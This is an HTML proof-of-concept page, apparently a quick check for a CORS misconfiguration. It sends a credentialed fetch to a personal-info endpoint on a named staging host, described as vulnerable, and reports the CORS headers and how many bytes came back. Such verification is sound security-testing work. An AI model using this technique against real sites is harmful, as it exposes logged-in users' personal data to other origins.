<!DOCTYPE html>
<html>
<body>
    <h2>Quick CORS Test</h2>
    <div id="output"></div>
    
    <script>
        async function test() {
            const output = document.getElementById('output');
            
            // Test the original vulnerable endpoint
            try {
                const response = await fetch(
                    'https://staging-app.271494016007.hellopublic.com/settings/v2/profile/personal-info',
                    {
                        method: 'GET',
                        mode: 'cors',
                        credentials: 'include'
                    }
                );
                
                output.innerHTML += `<p>Status: ${response.status}</p>`;
                output.innerHTML += `<p>ACAO Header: ${response.headers.get('access-control-allow-origin')}</p>`;
                output.innerHTML += `<p>ACAC Header: ${response.headers.get('access-control-allow-credentials')}</p>`;
                
                if (response.ok) {
                    const data = await response.text();
                    output.innerHTML += `<p>Success! Retrieved ${data.length} bytes</p>`;
                    console.log('Full response headers:', [...response.headers.entries()]);
                }
            } catch (error) {
                output.innerHTML += `<p>Error: ${error.message}</p>`;
            }
        }
        
        test();
    </script>
</body>
</html>
